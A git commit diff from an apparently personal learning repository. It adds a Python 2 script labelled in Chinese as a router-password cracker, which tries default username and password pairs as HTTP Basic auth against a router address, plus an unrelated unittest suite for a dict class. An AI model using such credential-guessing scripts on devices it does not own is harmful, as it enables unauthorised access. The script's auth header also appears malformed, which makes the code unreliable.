1ef9752ad6ee38ecdf84c7b708d600188b38ab43
masterliu <helbreatha@hotmail.com>
2017-02-25 09:39:54 +0800

    test

--- Untitled-1.py
+++ Untitled-1.py
@@ -1,1 +1,21 @@
-print 'hello'
+# -*- coding: UTF-8 -*-
+'''破解路由器密码
+firefox + tamper data
+http://www.cnblogs.com/virusdefender/p/3655885.html
+'''
+
+
+import base64
+import urllib2
+password_dic = [["root","root"],["admin","admin"]]
+request = urllib2.Request('http://12.12.12.1')
+
+for item in password_dic:
+    psw_base64 = "Basic" + base64.b64encode(item[0]+":"+ item[1])
+    request.add_header('Authorization',psw_base64)
+    try:
+        response = urllib2.urlopen(request)
+        print "correct! username:%s,pwd:%s"%(item[0],item[1])
+        break
+    except urllib2.HTTPError:
+        print "error"
--- other/test8.py
+++ other/test8.py
@@ -1,5 +1,41 @@
 # -*- coding: UTF-8 -*-
-class Ipy:
-    def fname(self,name):
-        self.name = name
-        
+import unittest
+
+from mydict import Dicta
+
+class TestDict(unittest.TestCase):
+    def test_init(self):
+        d = Dicta(a=1,b='test')
+        self.assertEqual(d.a, 1)
+        self.assertEqual(d.b, 'test')
+        self.assertTrue(isinstance(d,dict))
+
+    def test_key(self):
+        d = Dicta()
+        d['key'] = 'value'
+        self.assertEqual(d.key, 'value')
+
+    def test_attr(self):
+        d = Dicta()
+        d.key = 'value'
+        self.assertTrue('key' in d)
+        self.assertEquals(d['key'], 'value')
+
+    def test_keyerror(self):
+        d = Dicta()
+        with self.assertRaises(KeyError):
+            value = d['empty']
+
+    def test_attrerror(self):
+        d = Dicta()
+        with self.assertRaises(AttributeError):
+            value = d.empty
+
+    def setUp(self):
+        print 'setup'
+
+    def tearDown(self):
+        print 'teardown'
+
+    if __name__ == '__main__':
+        unittest.main()
